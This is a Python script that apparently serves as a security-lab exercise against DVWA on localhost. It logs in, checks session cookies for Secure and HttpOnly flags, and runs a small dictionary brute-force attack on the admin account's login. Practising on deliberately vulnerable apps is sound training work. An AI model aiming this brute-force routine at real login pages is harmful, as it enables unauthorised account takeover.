import requests
from bs4 import BeautifulSoup

# Configuration
BASE_URL = "http://localhost"
LOGIN_URL = f"{BASE_URL}/login.php"
# The specific page in DVWA designed to test brute force attacks
BRUTE_URL = f"{BASE_URL}/vulnerabilities/brute/"

# Wordlist for Brute Force (Dictionary Attack)
PASSWORDS_TO_TRY = ["123456", "admin123", "password", "qwerty", "letmein"]
TARGET_USER = "admin"

# Session setup
session = requests.Session()

def login_to_dvwa():
    """Initial login to access the main site."""
    print(f"[*] Authenticating to DVWA main dashboard...")
    try:
        response = session.get(LOGIN_URL)
        soup = BeautifulSoup(response.text, "html.parser")
        user_token = soup.find("input", {"name": "user_token"})['value']
        
        login_data = {
            "username": "admin",
            "password": "password", # We use correct creds just to get IN the tool first
            "Login": "Login",
            "user_token": user_token
        }
        session.post(LOGIN_URL, data=login_data)
        return True
    except Exception as e:
        print(f"[-] Setup failed: {e}")
        return False

def check_session_security():
    """Checks if session cookies are secure."""
    print(f"\n[*] Analyzing Session Cookies...")
    cookies = session.cookies
    
    for cookie in cookies:
        print(f"    [COOKIE] Name: {cookie.name}")
        
        # Check for 'Secure' flag (Cookies only sent over HTTPS)
        if cookie.secure:
            print("        [+] Secure Flag: ON (Good)")
        else:
            print("        [!] Secure Flag: OFF (Risk: Cookie can be intercepted)")
            
        # Check for 'HttpOnly' flag (Javascript cannot read the cookie)
        if cookie.has_nonstandard_attr('HttpOnly') or 'httponly' in cookie._rest:
             print("        [+] HttpOnly Flag: ON (Good)")
        else:
             print("        [!] HttpOnly Flag: OFF (Risk: XSS can steal this cookie)")

def test_brute_force():
    """Attempts to crack the password on the Brute Force page."""
    print(f"\n[*] Starting Brute Force Attack on: {BRUTE_URL}")
    print(f"    Target User: {TARGET_USER}")
    
    for password in PASSWORDS_TO_TRY:
        # DVWA Brute Force page uses GET parameters
        params = {
            "username": TARGET_USER,
            "password": password,
            "Login": "Login"
        }
        
        response = session.get(BRUTE_URL, params=params)
        
        # Check success indicator
        if "Welcome to the password protected area" in response.text:
            print(f"    [!!!] SUCCESS! Password Found: {password}")
            return
        else:
            print(f"    [-] Failed: {password}")

if __name__ == "__main__":
    if login_to_dvwa():
        check_session_security()
        test_brute_force()